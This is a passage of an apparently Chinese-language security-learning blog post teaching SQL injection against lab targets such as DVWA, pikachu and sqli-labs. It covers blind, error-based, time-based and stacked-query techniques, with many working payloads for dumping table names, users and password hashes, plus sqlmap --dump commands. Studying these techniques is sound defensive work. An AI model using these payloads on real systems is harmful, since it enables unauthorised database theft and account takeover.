class="line">X</span><br><span class="line">Y</span><br><span class="line">Z</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br><span class="line">f</span><br><span class="line">g</span><br><span class="line">h</span><br><span class="line">i</span><br><span class="line">j</span><br><span class="line">k</span><br><span class="line">l</span><br><span class="line">m</span><br><span class="line">n</span><br><span class="line">o</span><br><span class="line">p</span><br><span class="line">q</span><br><span class="line">r</span><br><span class="line">s</span><br><span class="line">t</span><br><span class="line">u</span><br><span class="line">v</span><br><span class="line">w</span><br><span class="line">x</span><br><span class="line">y</span><br><span class="line">z</span><br><span class="line">@</span><br><span class="line">_</span><br></pre></td></tr></table></figure>
+<p>每次都要与这些字符进行判断。最后得到 r是数据库名的第一个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),1,1)=&#x27;r&#x27;,1,0) --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),2,1)=&#x27;o&#x27;,1,0) --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),3,1)=&#x27;o&#x27;,1,0) --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring(database(),4,1)=&#x27;o&#x27;,1,0) --+</span><br></pre></td></tr></table></figure>
+<p>如果数据库名很长呢？我们不知道怎么办</p>
+<h5 id="burpsuite爆破库名"><a href="#burpsuite爆破库名" class="headerlink" title="burpsuite爆破库名"></a>burpsuite爆破库名</h5><p>拼接字符得到 root 库名</p>
+<h5 id="得到库名接着获取表名"><a href="#得到库名接着获取表名" class="headerlink" title="得到库名接着获取表名"></a>得到库名接着获取表名</h5><p>原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),1,1)=&#x27;g&#x27;,1,0) --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2),1,1)=&#x27;u&#x27;,1,0) --+</span><br></pre></td></tr></table></figure>
+<p>在burpsuite中设置三个变量</p>
+<p>limit 0，1    将0设置递归增加0-10</p>
+<p>if（ss，1，1） 将1设置递归增加至40</p>
+<p>字符a-z</p>
+<h5 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h5><p>在用 burpsuite 抓包修改变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 0,1),1,1)=&#x27;u&#x27;,1,0) --+</span><br></pre></td></tr></table></figure>
+<p>当前库的表的第一个列字符是否等于 u </p>
+<p>如果等于 u 返回正则页面 否则返回错误页面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id=1 and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; and TABLE_SCHEMA=database() limit 0,1),1,1)=&#x27;u&#x27;,1,0);</span><br></pre></td></tr></table></figure>
+<p>半自动注入 跑就ok</p>
+<p>首先跑查询账号和密码的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((SELECT LENGTH(CONCAT(user,0x3a,PASSWORD)) from users limit 1)=38,1,0) --+</span><br></pre></td></tr></table></figure>
+<p>然后使用 burpsuie 获取账号和密码</p>
+<h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)--+</span><br></pre></td></tr></table></figure>
+<p>burpsuite 抓包修改值 提交测试。</p>
+<p>最后整理结果得出 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure>
+<h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a>报错型注入</h3><p>数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息，例如语法错语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#x27;11064 - You have an error in your SQL syntax; check the manual that corresponds toyour MySQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>程序开发期间需要告诉使用者某些报错信息 方便管理员进行调试，</p>
+<p>定位文件错误</p>
+<p>特别 php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。</p>
+<p>在 php 中 使用 mysql_error()函数。</p>
+<p>如果 SQL 注入存在时，会有报错信息返回，可以采用报错注入。</p>
+<h5 id="代码中分析"><a href="#代码中分析" class="headerlink" title="代码中分析"></a>代码中分析</h5><p>打开 dvwa 分析语句 </p>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220816095446355.png" alt="image-20220816095446355" style="zoom:80%;" /></p>
+<p>如果语法错误，msqli_error()、mysqli_connect_error()会将语法错误信息 </p>
+<p>显示到页面上</p>
+<h5 id="SQL-报错注入攻击"><a href="#SQL-报错注入攻击" class="headerlink" title="SQL 报错注入攻击"></a><strong>SQL</strong> 报错注入攻击</h5><p>判断是否存在报错注入 </p>
+<p>输入单引号 如果报错有可能存在报错注入，</p>
+<p>如果拼接SQL 语句带入到 mysql 执行即存在报错注入。</p>
+<p>输入 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and info() --+</span><br></pre></td></tr></table></figure>
+<p> 就可以显示当前库</p>
+<p>原理是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE user_id = &#x27;1&#x27; and info() </span><br></pre></td></tr></table></figure>
+<p>会报错显示当前库不存在这个函数</p>
+<p> 这样当前库名就显示在页面上。</p>
+<h5 id="报错注入获取数据库敏感信息"><a href="#报错注入获取数据库敏感信息" class="headerlink" title="报错注入获取数据库敏感信息"></a>报错注入获取数据库敏感信息</h5><p>输入构造的攻击语句 页面返回数据库信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) --+</span><br></pre></td></tr></table></figure>
+<p>把 user()替换成其他的函数 version() 、database() 就能得到 mysql 得版本信息和当前库名。</p>
+<p>但是采用 updatexml 报错函数 只能显示 32 长度的内容</p>
+<p>如果获取的内容超过 32字符就要采用字符串截取方法。</p>
+<p>来每次获取 32 个字符串的长度</p>
+<p>除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。</p>
+<p>1.extractvalue()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --+</span><br></pre></td></tr></table></figure>
+<p>2.exp()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+<p>等等</p>
+<h5 id="其他函数介绍"><a href="#其他函数介绍" class="headerlink" title="其他函数介绍"></a>其他函数介绍</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure>
+<p>mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+<p>mysql对xml数据进行查询和修改的 xpath 函数，xpath 语法错误</p>
+<p>上面两个需要传入xpath格式的字符串，但是传入的却不符合，但可以执行，所以报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br></pre></td></tr></table></figure>
+<p>mysql 重复特性，此处重复了 version，所以报错，有些地方不管用</p>
+<p>如果等号“=”被禁用了，可以使用like或&lt;&gt;替换，&lt;&gt;意思是不等于，在前面加上！意思就是等于，</p>
+<p>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(tablem_name) where !(table_schema &lt;&gt; security) </span><br></pre></td></tr></table></figure>
+<h5 id="在黑盒模式下的报错注入"><a href="#在黑盒模式下的报错注入" class="headerlink" title="在黑盒模式下的报错注入"></a>在黑盒模式下的报错注入</h5><p>在黑盒模式下的报错注入 首先获取当前库，通过库获取表名</p>
+<p>接着通过表名获取字段，最后获取字段内容。</p>
+<h5 id="报错注入得到库名"><a href="#报错注入得到库名" class="headerlink" title="报错注入得到库名"></a>报错注入得到库名</h5><p>注入以后语句均可获取库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and info() --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) --+</span><br></pre></td></tr></table></figure>
+<p>得到库名 root</p>
+<h5 id="报错注入获取-mysql-账号和密码"><a href="#报错注入获取-mysql-账号和密码" class="headerlink" title="报错注入获取 mysql 账号和密码"></a>报错注入获取 <strong>mysql</strong> 账号和密码</h5><p>获取账号和密码需要 root 用户才有足够大的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select authentication_string from mysql.user limit 1;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select (updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))</span><br><span class="line">前32位</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))</span><br><span class="line">32到40位</span><br></pre></td></tr></table></figure>
+<h5 id="报错注入获取表名"><a href="#报错注入获取表名" class="headerlink" title="报错注入获取表名"></a>报错注入获取表名</h5><p>通过 mysql 内置库 information_schema 通过构造 SQL 语句查询获取表名</p>
+<p>采用 floor函数 报错</p>
+<p>并不会存在长度问题</p>
+<p>查询第一个表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure>
+<p>将 LIMIT 0,1 改成 1,1 表是第二个表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+<h5 id="报错注入获取字段"><a href="#报错注入获取字段" class="headerlink" title="报错注入获取字段"></a>报错注入获取字段</h5><p>在获取表名之后就可以获取字段名，如获取 usrs 的字段名</p>
+<p>获取第一个字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;users&#x27; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure>
+<p>获取第二个字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=&#x27;users&#x27; LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure>
+<p>可以使用 burpsuite 批量对字段批量获取，首先抓包，修改变量，设置匹配规则。 </p>
+<h5 id="报错注入获取信息"><a href="#报错注入获取信息" class="headerlink" title="报错注入获取信息"></a>报错注入获取信息</h5><p>现在已经获取 users 表的名字和它的字段名，接下来可以对内容进行查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure>
+<p>如果存在多个用户 把 limit 0,1 改成 1,1 如此类推知道获取最后一个用户为止</p>
+<p>使用 busrpsuite 对用户获取设置数量 再设置过滤网页响应内容。</p>
+<p>获取库里 users 表所有用户的账号和密码。</p>
+<p>updataxml函数  限制字数</p>
+<p>floor函数   不限制字数</p>
+<h3 id="时间延时型注入"><a href="#时间延时型注入" class="headerlink" title="时间延时型注入"></a>时间延时型注入</h3><p>时间注入又名延时注入，属于盲注入的一种</p>
+<p>通常是某个注入点无法通过布尔型注入获取数据而采用一种突破注入的技巧</p>
+<p>在 mysql 里 函数 sleep() 是延时的意思，sleep(10)就是 数据库延时 10 秒后返回内容。</p>
+<p>判断注入可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1 and sleep(10) </span><br></pre></td></tr></table></figure>
+<p>数据库延时 10 秒返回值 网页响应时间至少要 10 秒 根据这个原理来判断存在 SQL 时间注入。</p>
+<p>mysql 延时注入用到的函数 sleep() 、if()、substring()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(2&gt;1,sleep(10),0) </span><br></pre></td></tr></table></figure>
+<p>2&gt;1 这个部分就是你注入要构造的 SQL 语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(length(database())&gt;1,sleep(5),0)</span><br></pre></td></tr></table></figure>
+<p> 这个就是查询当前库名长度大于 1 就会延时 5 秒执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or if(length(database())&gt;1,sleep(5),0) --+ </span><br></pre></td></tr></table></figure>
+<p>可以看到网页是大于五秒返回。根据这个原理 n&gt;1      n不延时就能确定当前数据库的长度了。 </p>
+<h5 id="具体意思"><a href="#具体意思" class="headerlink" title="具体意思"></a>具体意思</h5><p>　　若网站执行了sql后，不管是否出错，都返回正常页面(不回显信息）。那么我们就不能通过返回的页面来指挥注入了。</p>
+<p>　　此时就要用基于时间延迟的注入，使用sleep()函数来控制sql执行的时间。</p>
+<p>​        从而判断我们的语句是否执行正确。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id = 1 and if (substring(version(),1,1)=5,1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+<p>这条语句执行时，如果mysql版本不是5，则延时5秒，根据页面返回时长来判断数据库版本。</p>
+<h5 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h5><p>　　时间注入是盲注入的一种，利用的场景是当目标无法使用布尔盲注获得数据时，就可以使用这种基于时间延迟的注入</p>
+<p>　　利用语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(length(database())&gt;1,sleep(5),0 )</span><br></pre></td></tr></table></figure>
+<p>　　这里的意思是数据库名的长度如果大于1就延时5秒返回结果</p>
+<h5 id="sqlmap利用"><a href="#sqlmap利用" class="headerlink" title="sqlmap利用"></a>sqlmap利用</h5><h6 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">-u 表示检测的 url</span><br><span class="line"></span><br><span class="line">-p 指定的检测参数是哪一个</span><br><span class="line"></span><br><span class="line">http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2</span><br><span class="line"></span><br><span class="line">-p name </span><br><span class="line"></span><br><span class="line">-v 显示等级</span><br><span class="line">-v #详细的等级(0-6)</span><br><span class="line">0：只显示Python的回溯，错误和关键消息。</span><br><span class="line">1：显示信息和警告消息。</span><br><span class="line">2：显示调试消息。</span><br><span class="line">3：有效载荷注入。</span><br><span class="line">4：显示HTTP请求。</span><br><span class="line">5：显示HTTP响应头。</span><br><span class="line">6：显示HTTP响应页面的内容</span><br><span class="line"></span><br><span class="line">--technique=T  检测方法为时间注入</span><br><span class="line"></span><br><span class="line">--dbms mysql   指定检测数据库是mysql类型</span><br><span class="line"></span><br><span class="line">--threads 10   设置线程数</span><br><span class="line"></span><br><span class="line">--current-user 获取用户名</span><br><span class="line"></span><br><span class="line">--current-db   获取当前数据库名</span><br><span class="line"></span><br><span class="line">--batch        使用默认模式 自动确认Yes</span><br><span class="line"></span><br><span class="line">--tables -D 指定数据库  获取指定数据库的表名</span><br><span class="line"></span><br><span class="line">--columns 默认字典 -T 指定表名  获取指定表的字段名</span><br><span class="line"></span><br><span class="line">--dump 导出数据</span><br><span class="line"></span><br><span class="line">-C 指定查询的字段</span><br></pre></td></tr></table></figure>
+<p>参数 —technique 用于指定检测注入时所用技术。</p>
+<p>默认情况下 Sqlmap 会使用自己支持的全部技术进行检测。</p>
+<p> 此参数后跟表示检测技术的大写字母，其值为 B、E、U、S、T 或Q</p>
+<p>含义如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">B：Boolean-based blind（布尔型注入）</span><br><span class="line"></span><br><span class="line">　　E：Error-based        （报错型注入）</span><br><span class="line"></span><br><span class="line">　　U：Union query-based  （可联合查询注入）</span><br><span class="line"></span><br><span class="line">　　S：Stacked queries    （可多语句查询注入）</span><br><span class="line"></span><br><span class="line">　　T：Time-based blind    （基于时间延迟注入）</span><br><span class="line"></span><br><span class="line">　　Q：Inline queries     （嵌套查询注入）</span><br></pre></td></tr></table></figure>
+<p>　　可以用 “—technique ES”  来指定使用两种检测技术。”</p>
+<p>​        —technique=BEUSTQ” 与默认情况等效。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u  &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --technique=B --banner</span><br></pre></td></tr></table></figure>
+<p>sqlmap 设置时间盲注延迟时间：</p>
+<p>用 <code>--time-sec 3</code> 参数设置基于时间延迟注入中延时时长，默认为 5 秒</p>
+<h6 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T -v 1 --dbms mysql </span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829143858098.png" alt=""></p>
+<h6 id="列出库名"><a href="#列出库名" class="headerlink" title="列出库名"></a>列出库名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T -v 1 --dbms mysql --current-user --current-db --threads 10 --batch</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829144201531.png" alt=""></p>
+<h6 id="列出表名"><a href="#列出表名" class="headerlink" title="列出表名"></a>列出表名</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T -v 1 --dbms mysql --tables -D pikachu --batch</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829144510934.png" alt="image-20220829144510934"></p>
+<h6 id="列出字段"><a href="#列出字段" class="headerlink" title="列出字段"></a>列出字段</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T -v 1 --dbms mysql --columns -T users -D pikachu --batch</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829144429972.png" alt="image-20220829144429972"></p>
+<h6 id="列出数据"><a href="#列出数据" class="headerlink" title="列出数据"></a>列出数据</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name --technique=T --dump -v 1 --dbms mysql -C &quot;id,username,password&quot; -T users -D pikachu --threads 10 --batch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.31.231/pikachu/vul/sqli/sqli_str.php?name=vince&amp;submit=1&quot; -p name -v 1 --technique=T --dump -C &quot;id,username,password&quot; -T users -D pikachu --batch</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829144443813.png" alt="image-20220829144443813"></p>
+<h3 id="堆叠查询型注入"><a href="#堆叠查询型注入" class="headerlink" title="堆叠查询型注入"></a>堆叠查询型注入</h3><p>堆叠查询：堆叠查询可以执行多条 SQL 语句，语句之间以分号(;)隔开</p>
+<p>而堆叠查询注入攻击就是利用此特点，在第二条语句中构造要执行攻击的语句。</p>
+<p>在SQL中，分号（;）是用来表示一条sql语句的结束。</p>
+<p>在 ; 结束一个sql语句后继续构造下一条语句，会一起执行</p>
+<p>在 mysql 里有以下函数执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_multi_query </span><br></pre></td></tr></table></figure>
+<p>函数可以执行一个或多个针对数据库的查询。多个查询用分号进行分隔。</p>
+<p>但是堆叠查询只能返回第一条查询信息，不返回后面的信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select version();select database()</span><br><span class="line"></span><br><span class="line">;show databases</span><br><span class="line"></span><br><span class="line">;show tables</span><br><span class="line"></span><br><span class="line">;show columns from tables</span><br></pre></td></tr></table></figure>
+<p>堆叠注入的危害是很大的 可以任意使用增删改查的语句，</p>
+<p>例如删除数据库 修改数据库，添加数据库用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">备注：堆叠注入的可以运用于创建用户由于我们使用网站用户进行注入不能查看到数据库的密码但是我们可以创建用户来登录迂回的注入数据库</span><br><span class="line">但是前提是网站的管理员必须是高权限才能完全创建用户</span><br><span class="line">也可以使用update更新管理员用户密码。</span><br></pre></td></tr></table></figure>
+<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>靶场启动</p>
+<p>在堆叠注入页面中，程序获取 get 参数的 id ，使用 mysqli 的方式进行数据查询，</p>
+<p>在执行语句时候使用了 mysqli_multi_query 函数处理 sql 语句，导致存在堆叠注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span 